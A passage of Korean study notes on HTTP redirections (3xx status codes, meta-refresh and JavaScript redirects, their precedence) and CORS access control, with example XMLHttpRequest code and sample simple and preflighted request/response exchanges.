- 범위 요청과 청크는 호환되어 함께 사용할 수도 있고, 따로 사용할 수 있다. 


## 8. Redirections in HTTP

- URL 리다이렉션 혹은 URL 포워딩은 페이지 따위의 실제 리소스, 폼 혹은 전체 웹 애플리케이션이 다른 URL에 위치하고 있는 상태에서 링크를 존속시키는 기술이다. 
- HTTP는 많은 목표를 위해 사용되는 이런 동작을 수행하기 위해 특별한 종류의 응답인 HTTP 리다이렉트를 제공한다. 
- 사이트 유지관리가 진행중인 상태에서의 일시적인 리다이렉션, 사이트 아키텍쳐의 변경 이후에도 외부 링크를 동작하는 상태로 유지시키기 위한 영구적인 리다이렉션, 파일 업로드 시 진행 상태 페이지 그리고 그 외의 수많은 리다이렉션 들...

## 8.1 principle

- HTTP에서, 리다이렉션은 요청에 대해 특별한 응답(리다이렉트)을 전송함으로써 촉발된다. 
- HTTP 리다이렉트는 3xx 상태 코드를 지닌 응답이다. 
- 리다이렉트 응답을 수신한 브라우저는, 제공된 새로운 URL을 사용하며 그것을 즉시 로드한다. 
- 대부분의 경우, 리다이렉션은 사용자에게는 보이지 않는데다가, 적은 성능 저하를 일으킨다. 
- 리다이렉트에는 몇 가지 유형이 있으며 세 가지 카테고리로 나누어진다. 

## 8.1.1 영속적인 리다이렉션

- 이 리다이렉션은 영원히 지속됨을 의미한다. 
- 원래의 URL이 더 이상 사용되지 않아야 하며 새로운 URL을 더 선호해야 함을 시사한다. 
- 검색 엔진 로봇은 그들의 인덱스 내에서 리소스에 대한 연관 URL의 갱신을 촉발시킨다. 
- 301, 308

## 8.1.2 일시적인 리다이렉션

- 때때로 요청된 리소스는 그것의 표준 위치에서 접근할 수 없고 다른 위치에서 접근 가능한 경우가 있다. 
- 이런 경우 일시적인 리다이렉트가 사용될 수 있다. 
- 검색 엔진 로봇은 새로운, 일시적인 링크를 기억하지 못한다. 
- 일시적인 리다이렉션은 일시적인 진행율 페이지를 표시하고자 리소스를 만들고 갱신하며 삭제할 때 사용될 수 있다. 
- 302, 303, 307

## 8.1.3 특수 리다이렉션

- 이런 보통 리다이렉션과 더불어 특별한 두 가지 리다이렉션이 있다. 
- 304(수정되지 않음)은 (오래된) 로컬에 캐시된 복사본으로 페이지를 리다이렉트 시키며, 300(다중 선택)은 수동 리다이렉션이다. 
- 브라우저에 의해 웹 페이지로 표현되는 본문은 가능한 리다이렉션을 나열하며 사용자는 그 중 하나를 선택하기 위해 클릭한다. 

## 8.2 리다이렉션을 명시하는 대체 방법

- HTTP 리다이렉트가 리다이렉션을 정의하는 유일한 방법은 아니다. 
- 두 개의 다른 방법이 존재한다. 
- <meta>엘리먼트를 사용하는 HTML 리다이렉션과 DOM을 사용하는 자바스크립트 리다이렉션이 있다. 

## 8.2.1 HTML 리다이렉션

- HTTP 리다이렉트는 리다이렉션을 만드는 방법으로 선호되지는 않지만, 때때로 웹 개발자는 서버에 대한 제어권을 가지고 있지 않거나 그것을 구성할 수 없는 경우가 있다. 
- 이런 특수한 상황들 때문에, 웹 개발자들은 refresh를 설정하기 위해 페이지의 head내에 meta 엘리먼트와 http-equv 속성으로 HTML 페이지를 만들 수 있다. 
- 해당 페이지를 디스플레이 할 때, 브라우저는 이 엘리먼트를 발견하고 표시된 페이지로 이동할 것이다. 
- content 속성은 주어진 URL로 리다이렉트 하기 이전에 브라우저가 얼마만큼 시간(초)을 기다려야 하는지를 나타내는 숫자로 시작된다. 
- 더 나은 접근성을 위해 항상 0으로 설정해야 한다. 
- 두 말할 필요없이, 이 메서드는 HTML 페이지(혹은 그와 유사한 무언가)에서만 동작하며 이미지나 다른 어떤 종류의 컨텐츠에 대해서 사용될 수 없다. 

~~~
<head> 
  <meta http-equiv="refresh" content="0;URL='http://www.example.com/'" />
</head>
~~~

## 8.2.2 자바스크립트 리다이렉션

- 자바스크립트 내에서의 리다이렉션은 window.location 프로퍼티에 값을 설정해서 만들어지며 새로운 페이지가 로드된다. 
- HTML 리다이렉션처럼, 모든 리소스에서 동작하는 것은 아니며, 명백하게 자바스크립트를 실행한 클라이언트 상에서만 동작한다. 
- 하지만 다른점은, 예를 들어 어떤 조건이 충족되는 경우에만 리다이렉션을 촉발시킬 수 있다는 점에서 더 많은 가능성을 가지고 있다. 


## 8.2.3 우선 순위

1. 페이지가 읽힌 적도 없고 전송된 적도 없는 경우, HTTP 리다이렉트가 항상 먼저 실행된다. 
2. 어떤 HTTP 리다이렉트도 없는 경우에, HTML 리다이렉트(<meta>)가 실행된다. 
3. 자바스크립트 리다이렉트는 최후의 수단으로 사용되며, 클라이언트 측에서 자바스크립트를 활성화시킨 경우에만 사용할 수 있다. 

- 가능한 경우, 항상 HTTP 리다이렉트를 사용해야 하며, <meta> 엘리먼트를 사용해서는 안된다. 
- 만약 개발자가 HTTML 리다이렉트를 변경하고 HTML 리다이렉트를 잊는다면, 리다이렉트는 더 이상 동일한 것이 아니거나, 무한 루프로 종료되거나 다른 악몽이 시작될 수도 있다. 

## 9. HTTP 접근 제어(CORS)

- 처음 전송되는 리소스의 도메인과 다른 도메인으로부터 리소스가 요청될 경우 해당 리소스는 cross-origin HTTP 요청에 의해 요청된다. 
- 예를 들어, http://domain-a.com으로부터 전송되는 HTML 페이지가 <img> src 속성을 통해 http://domain-b.com/image.jpg를 요청하는 경우가 있다. 
- 오늘날 많은 웹 페이지들은 CSS 스타일 시트, 이미지, 그리고 스크립트와 같은 리소스들을 각각의 출러로부터 읽어온다. 

- 보안 상의 이유로, 브라우저들은 스크립트 내에서 초기화되는 cross-origin HTTP 요청을 제한한다. 
- 예를 들면, XMLHttpRequest는 same-origin 정책을 따르기에 XMLHttpRequest를 사용하는 웹 애플리케이션은 자신과 동일한 도메인으로 HTTP 요청을 보내는 것만 가능했다. 
- 웹 애플리케이션을 개선시키기 위해, 개발자들은 브라우저 벤더사들에겍 XMLHttpRequest가 cross-domain 요청을 할 수 있도록 요청했다. 

- W3C는 새로운 CORS 매커니즘을 권하고 있다. 
- CORS는 웹 서버에게 보안 cross-domain 데이터 전송을 활성화하는 cross-domain 접근 제어권을 부여한다. 
- 모던 브라우저들은 cross-origin HTTP 요청의 위험성을 완화시키기 위해 API 컨테이너에서 CORS를 사용한다. 

## 9.1 overview

- CORS 표준은 웹 브라우저가 사용하는 정보를 읽을 수 있도록 허가된 출처 집합을 서버에게 알려주도록 허용하는 HTTP 헤더를 추가함으로써 동작한다. 
- 추가적으로, 사용자 데이터 상에서 부수 효과를 일으킬 수 있는 HTTP 요청 메서드에 대해(특히, GET 이외의 HTTP 메서드들 혹은 어떤 MIME 타입을 사용하는 POST 사용에 대해), 스펙은 브라우저가 요청을 "preflight"(사전 전달)하도록 강제하는데, 이는 HTTP OPTIONS 요청 메서드를 이용해 서버로부터 지원 중인 메서드들을 내려받은 뒤, 서버에서 "approval"(승인) 시에 실제 HTTP 요청 메서드를 이용해 실제 요청을 전송하는 것을 말한다. 
- 서버들은 또한 클라이언트에게 (Cookie와 HTTP Authentication 데이터를 포함하는) "credentials"가 요청과 함께 전송되어야 하는지를 알려줄 수도 있다. 

## 9.2 Example of access control scenarios

- CORS의 세가지 예제를 보여줄 것이다. 
- 모든 예제는 지원되는 모든 브라우저에서 cross-site 요청에 사용 될 수 있는 XMLHttpRequest 객체를 사용한다. 

## 9.2.1 간단한 요청

- 간단한 cross-site 요청은 다음의 조건들에 모두 부합하는 것 중 하나이다. 
    - 허용된 유일한 메서드들은 다음과 같다
        - GET
        - POST
        - HEAD
    - 사용자 에이전트에 의해 자동으로 설정되는 헤더(Connection, User-Agent 등)들을 제외하고, 수동 설정이 허용되는 유일한 헤더들은 다음과 같다. 
        - Accept
        - Accept-Language
        - Content-Language
        - Content-Type
    - Content-Type 헤더에 대해 허용되는 유일한 값은 다음과 같다
        - application/x-www-form-urlencoded
        - multipart/form-data
        - text/plain

- 이 모든 것들은 웹 컨텐츠가 사전에 발행할 수 있는 cross-site 요청의 동일한 분류이며, 서버가 알맞은 헤더를 전송하지 않을 경우 요청자에게 응답 데이터가 전달되지 않는다. 
- 그러므로, cross-site 요청 위조를 예방하고 있는 사이트들은 HTTP 접근 제어에서 오는 위협에 대해 두려워할만 한 것이 없다. 

- 예를 들어, http://foo.example 도메인 상의 웹 컨텐츠가 http://bar.other 도메인 상의 컨텐츠를 호출한다고 가정하면, "foo.example"에 배포되는 자바스크립트 내에서는 다음과 같은 분류의 코드가 사용될 수 있다. 

~~~
var invocation = new XMLHttpRequest();
var url = 'http://bar.other/resources/public-date/';

function callOtherDomain() {
    if(invocation){
        invocation.open('GET', url, true);
        invocation.onreadystatechange = handler;
        invocation.send();
    }
}
~~~

- 이런 경우 브라우저가 서버에 전송하게 될 내용, 그리고 서버가 응답하는 방식은 다음과 같다. 

~~~
// request
GET /resources/public-data/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv: 1. 9.1b3pre) Gecko/20081130 Minfield/3.1b3pre
Accept: text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us, en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1, utf-8;q=0.7, *;q=0.7
Connection: keep-alive
Referer: http://foo.example/examples/access-control/simpleXSInvocation.html
Origin: http://foo.example


// response
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 00:23:52 GMT
Server: Apache/2.0.61
Access-Control-Allow-Origin: *
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Transfet-Encoding: chunked
Content-Type: application/xml

[XML Data]
~~~

- Origin 헤더는 해당 요청이 http://foo.example로부터 온 것을 알려준다.
- Access-Control-Allow-Origin 헤더를 통해 접근 가능 범위를 설정할 수 있다. '*'를 사용하면 리소스가 cross-site 방식 내에서 모든 도메인으로부터 접근 가능하다는 것을 의미한다. 만약 http://bar.other에 있는 리소스의 소유자가 리소스에 대한 접근을 http://foo.example에게만 허용하길 바란다면, 다음과 같이 해야한다. 

~~~
Access-Control-Allow-Origin: http://foo.example
~~~

- 이렇게 선언하게 되면 http://foo.example외의 어떤 다른 도메인도 cross-site 방식으로 리소스에 접근할 수 없다. 
- Access-Control-Allow-Origin 헤더는 요청의 Origin 헤더를 통해 전송되었던 값을 포함해야 한다. 

## 9.2.2 사전 요청

- preflighted 요청은 먼저, 실제 요청이 전송하기에 안전한지 아닌지를 결정하기 위해 다른 도메인에 있는 리소스에 OPTIONS 메서드로 HTTP 요청을 전송한다. 
- Cross-site 요청은 사용자 데이터에 대한 함축적인 의미를 가지고 있기에 이와 같이 사전 전달된다. 
    - GET, HEAD 혹은 POST 외의 메서드를 사용하는 경우, 또한 POST 메서드를 사용한 요청이 application/x-www-urlencoded, multipart/form-data, text/plain 이외의 다른 값을 가진 Content-Type과 함께 요청 데이터를 전송하는데 사용된 경우에도 그렇다. 
    - 예를 들면, POST 요청이 서버에 application/xml 혹은 text/xml을 사용하여 XML 페이로드를 전송하게 되면 요청은 사전 전달된다. 
    - 요청 내에 커스텀 헤더를 설정한 경우

~~~
var invocation = new XMLHttpRequest();
var url = 'http://bar.other/resources/post-here/';
var body = '<?xml version="1.0"?><person><name>Arun</name></person>';
    
function callOtherDomain(){
  if(invocation)
    {
      invocation.open('POST', url, true);
      invocation.setRequestHeader('X-PINGOTHER', 'pingpong');
      invocation.setRequestHeader('Content-Type', 'application/xml');
      invocation.onreadystatechange = handler;
      invocation.send(body); 
    }
}

......
~~~

~~~
// preflight
OPTIONS /resources/post-here/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Origin: http://foo.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-PINGOTHER


HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://foo.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER
Access-Control-Max-Age: 1728000
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 0
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain

POST /resources/post-here/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
X-PINGOTHER: pingpong
Content-Type: text/xml; charset=UTF-8
Referer: http://foo.example/examples/preflightInvocation.html
Content-Length: 55
Origin: http://foo.example
Pragma: no-cache
Cache-Control: no-cache

<?xml version="1.0"?><person><name>Arun</name></person>


HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:40 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://foo.example
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 235
Keep-Alive: timeout=2, max=99
Connection: Keep-Alive
Content-Type: text/plain

[Some GZIP'd payload]
~~~